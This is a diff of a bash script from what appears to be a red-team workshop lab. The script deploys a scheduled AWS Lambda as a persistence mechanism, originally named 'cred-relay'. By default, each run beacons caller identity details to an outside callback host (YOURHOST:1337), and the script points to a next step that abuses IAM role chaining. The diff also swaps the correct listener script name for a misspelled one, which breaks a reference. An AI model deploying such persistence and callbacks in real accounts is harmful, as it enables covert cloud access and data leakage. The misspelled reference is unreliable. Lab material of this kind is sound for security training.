@@ -1,31 +1,30 @@
 #!/usr/bin/env bash
-# Speaker Part B, step 1: deploy the persistence Lambda and EventBridge schedule
-# live from the projector session.
+# Take-home step 1: deploy the persistence Lambda and EventBridge schedule in
+# the attendee's dedicated lab account. The optional TLS callback behavior is
+# intentionally preserved from the presenter demonstration.
 #
-# Prereqs:
-#   - terraform/speaker-demo applied
-#   - Speaker AWS credentials active (admin or equivalent)
-#   - LAMBDA_EXEC_ROLE_ARN from terraform output
-#   - AWS_REGION set
-#
-# Demonstration narrative:
-#   "This Lambda was never deployed by this org. I created it right now using
-#    the same AWS session an attacker would have after compromising the build
-#    role. It will fire every 2 minutes from now on, and every invocation proves
-#    fresh access and visibility into the account. No traffic
-#    leaves AWS. No endpoint is implanted. No process runs on a host."
+# Prerequisites:
+#   - terraform/advanced-chain applied in a dedicated empty AWS account
+#   - the Terraform output contract from attendee-runbook.md exported
+#   - start-proof-listner.sh running when ENABLE_PROOF_CALLBACK=1
 set -euo pipefail
 
-: "${LAMBDA_EXEC_ROLE_ARN:?set LAMBDA_EXEC_ROLE_ARN from terraform output}"
-: "${AWS_REGION:?set AWS_REGION}"
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd -P)"
+# shellcheck source=_common.sh
+source "${SCRIPT_DIR}/_common.sh"
 
-NAME_PREFIX="${NAME_PREFIX:-rtv-speaker-demo}"
-FUNCTION_NAME="${NAME_PREFIX}-cred-relay"
-RULE_NAME="${NAME_PREFIX}-cred-relay-trigger"
+require_env LAMBDA_EXEC_ROLE_ARN
+require_command zip
+caller_arn="$(preflight_account)"
+
+NAME_PREFIX="rtv-take-home"
+FUNCTION_NAME="${NAME_PREFIX}-persistence"
+RULE_NAME="${NAME_PREFIX}-persistence-trigger"
 SCHEDULE="${SCHEDULE:-rate(2 minutes)}"
 ENABLE_PROOF_CALLBACK="${ENABLE_PROOF_CALLBACK:-1}"
 PROOF_CALLBACK_URL="${PROOF_CALLBACK_URL:-https://YOURHOST:1337/}"
 PROOF_DETAIL_MODE="${PROOF_DETAIL_MODE:-identity}"
+
 [[ "$PROOF_DETAIL_MODE" == "basic" || "$PROOF_DETAIL_MODE" == "identity" ]] || {
   echo "ERROR: PROOF_DETAIL_MODE must be basic or identity" >&2
   exit 1
@@ -37,7 +36,7 @@ if [[ "$ENABLE_PROOF_CALLBACK" == "1" ]]; then
   }
   PROOF_CALLBACK_CA_FILE="${PROOF_CALLBACK_CA_FILE:-/tmp/rtv-proof-listener-ca.pem}"
   [[ -r "$PROOF_CALLBACK_CA_FILE" ]] || {
-    echo "ERROR: start-proof-listener.sh must be running before callback deployment" >&2
+    echo "ERROR: start-proof-listner.sh must be running before callback deployment" >&2
     exit 1
   }
 elif [[ "$ENABLE_PROOF_CALLBACK" != "0" ]]; then
@@ -48,7 +47,6 @@ else
 fi
 LAMBDA_ENVIRONMENT="Variables={PROOF_CALLBACK_URL=${PROOF_CALLBACK_URL},PROOF_SESSION_LABEL=${NAME_PREFIX},PROOF_DETAIL_MODE=${PROOF_DETAIL_MODE}}"
 
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 SRC_DIR="${SCRIPT_DIR}/lambda-src"
 BUILD_DIR="$(mktemp -d)"
 trap 'rm -rf "$BUILD_DIR"' EXIT
@@ -120,7 +118,7 @@ RULE_ARN=$(aws events describe-rule \
 echo "[4/5] Wiring the rule to the Lambda..."
 aws events put-targets \
   --rule "$RULE_NAME" \
-  --targets "Id=1,Arn=${LAMBDA_ARN}" \
+  --targets "Id=persistence-proof,Arn=${LAMBDA_ARN}" \
   --region "$AWS_REGION" >/dev/null
 
 # EventBridge needs permission to invoke the Lambda
@@ -145,4 +143,4 @@ echo "Persistence is live. Follow the logs with:"
 echo "  aws logs tail ${LOG_GROUP} --since 5m --follow --region ${AWS_REGION}"
 echo ""
 echo "Rule schedule: ${SCHEDULE}. The Lambda will re-fire automatically."
-echo "Run 02-abuse-iam-chain.sh next."
+echo "Run 02-assume-one-role.sh next."
